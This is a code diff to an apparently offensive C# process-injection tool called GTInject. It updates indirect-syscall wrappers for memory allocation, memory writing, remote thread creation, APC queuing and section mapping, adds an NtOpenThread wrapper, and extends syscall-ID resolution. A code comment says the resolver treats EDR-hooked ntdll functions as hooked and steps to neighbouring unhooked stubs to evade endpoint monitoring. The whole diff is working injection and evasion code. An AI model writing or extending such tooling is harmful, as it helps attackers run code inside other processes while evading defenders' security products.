@@ -305,7 +305,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtOpenProcess");
+            (syscall[4], syscall[5], syscallMemAddr) = GetIndirectSysCall("NtOpenProcess");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -342,7 +342,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtAllocateVirtualMemory");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtAllocateVirtualMemory");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -379,7 +379,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtWriteVirtualMemory");
+            (syscall[4], syscall[5], syscallMemAddr) = GetIndirectSysCall("NtWriteVirtualMemory");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -416,7 +416,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtProtectVirtualMemory");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtProtectVirtualMemory");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -454,7 +454,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtCreateThreadEx");
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
             //Console.WriteLine(syscallmemstring);
             byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
@@ -491,7 +491,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtCreateSection");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtCreateSection");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -528,7 +528,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtMapViewOfSection");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtMapViewOfSection");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -566,7 +566,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtQueueApcThread");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtQueueApcThread");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -603,7 +603,7 @@ namespace GTInject.SysCalls
             // dynamically resolve the syscall
             byte[] syscall = bIndirectSysCallStub;
             IntPtr syscallMemAddr;
-            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtResumeThread");
+            (syscall[4],syscall[5], syscallMemAddr) = GetIndirectSysCall("NtResumeThread");
 
             //Format our memory address
             var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
@@ -635,7 +635,42 @@ namespace GTInject.SysCalls
             }
         }
 
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtOpenThread(out IntPtr hThread, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID cId)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscall[5], syscallMemAddr) = GetIndirectSysCall("NtOpenThread");
 
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtOpenThread assembledFunction = (Delegates.DelgNtOpenThread)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtOpenThread));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(out hThread,  DesiredAccess, ref ObjectAttributes, ref cId);
+                }
+            }
+        }
 
         ////////////////////////////
         // Other Functions
@@ -692,7 +727,7 @@ namespace GTInject.SysCalls
                     byte highByte = (byte)((decrementedValue >> 8) & 0xFF);
                     byte lowByte = (byte)(decrementedValue & 0xFF);
                     byte[] decrementedByteArray = { lowByte, highByte };
-                    Console.WriteLine($"[+] Decremented Byte Array: {decrementedByteArray[0]:X2}, {decrementedByteArray[1]:X2}");
+                    Console.WriteLine($"     Decremented Byte Array: {decrementedByteArray[0]:X2}, {decrementedByteArray[1]:X2}");
 
                     return (decrementedByteArray[0],decrementedByteArray[1]);
                 }
@@ -708,7 +743,7 @@ namespace GTInject.SysCalls
         }
 
 
-        public static (byte, IntPtr) GetIndirectSysCall(string FunctionName)
+        public static (byte, byte, IntPtr) GetIndirectSysCall(string FunctionName)
         {
             byte[] syscall_code = { 0x0f, 0x05, 0xc3 };
             UInt32 distance_to_syscall = 0x12;
@@ -724,9 +759,9 @@ namespace GTInject.SysCalls
             {
                 // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                 bool hooked = false;
-
-                var instructions = new byte[5];
-                Marshal.Copy(funcAddress, instructions, 0, 5);
+                var syscallID = new byte[2];
+                var instructions = new byte[6];
+                Marshal.Copy(funcAddress, instructions, 0, 6);
                 // Edited to the 4th byte - found some EDRs jmp after the initial mov r10, rcx, should consider that hooked
                 if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[4] { instructions[0], instructions[1], instructions[2], instructions[3] }, new byte[4] { 0x4C, 0x8B, 0xD1, 0xB8 }))
                 {
@@ -735,11 +770,31 @@ namespace GTInject.SysCalls
 
                 if (!hooked)
                 {
-                    byte sysId = (byte)(instructions[4] - count);
-                    Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", sysId, FunctionName);
+                    //byte sysId = (byte)(instructions[4] - count);
+                    //Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", sysId, FunctionName);
+                    //IntPtr syscallInstruction = (IntPtr)((UInt64)funcAddress + (UInt64)distance_to_syscall);
+                    //Console.WriteLine("     Syscall instruction address " + syscallInstruction);
+                    //return (sysId, syscallInstruction);
+                    //Console.WriteLine("     Syscall ID dynamically resolved {1} to {0:X2}", (byte)(instructions[4] - count), FunctionName);
+                    // Not hooked, so take the two bytes we care about and store them in the syscallID byte array
+
+                    // Get the SysCall opcodes address in memory
+                    // This is technically not correctly, we're using the Syscall instruction for the unhooked function, not the actual function we're syscalling. 
+                    // Strictly speaking, we should decrement back to the original function address and use that syscall opcode memory address
                     IntPtr syscallInstruction = (IntPtr)((UInt64)funcAddress + (UInt64)distance_to_syscall);
-                    Console.WriteLine("     Syscall instruction address " + syscallInstruction);
-                    return (sysId, syscallInstruction);
+
+                    Array.Copy(instructions, instructions.Length - 2, syscallID, 0, 2);
+                    int combinedByteArrayValue = (syscallID[1] << 8) | syscallID[0]; // combined byte array was easy to visualize during testing
+                    int decrementedValue = combinedByteArrayValue - count; // and easy to decrement
+                    Console.WriteLine("[+] Syscall ID dynamically resolved " + FunctionName + " to " + decrementedValue);
+
+                    // restore back to bytes that will be written in the direct syscall byte stub
+                    byte highByte = (byte)((decrementedValue >> 8) & 0xFF);
+                    byte lowByte = (byte)(decrementedValue & 0xFF);
+                    byte[] decrementedByteArray = { lowByte, highByte };
+                    Console.WriteLine($"     Decremented Byte Array: {decrementedByteArray[0]:X2}, {decrementedByteArray[1]:X2}");
+
+                    return (decrementedByteArray[0], decrementedByteArray[1], syscallInstruction);
                 }
 
                 funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
@@ -747,7 +802,7 @@ namespace GTInject.SysCalls
                 if (count > 2500)
                 {
                     Console.WriteLine("     This is a failure, but don't infinite loop.. not again");
-                    return ((byte)0, IntPtr.Zero);
+                    return ((byte)0, (byte)0, IntPtr.Zero);
                 }
             }
         }
